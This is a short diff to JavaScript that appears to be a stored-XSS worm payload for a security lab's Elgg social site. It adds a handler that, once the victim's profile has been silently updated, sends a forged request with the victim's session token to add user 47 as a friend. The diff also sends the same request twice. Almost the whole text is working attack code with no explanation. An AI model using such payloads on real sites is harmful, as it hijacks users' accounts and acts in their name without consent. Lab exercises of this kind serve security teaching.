@@ -20,6 +20,17 @@ window.onload = function() {
     Ajax.setRequestHeader("Content-Type",
       "application/x-www-form-urlencoded");
     Ajax.send(content);
+
+    Ajax.onload = function() {
+        //Code for Adding friend after profile is updated
+        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token + ts + token;
+        var friendAjax = new XMLHttpRequest();
+        friendAjax.open("GET", sendurl, true);
+        friendAjax.setRequestHeader("Host", "www.xsslabelgg.com");
+        friendAjax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        friendAjax.send();
+    };
+    Ajax.send(content);
   }
 }
 
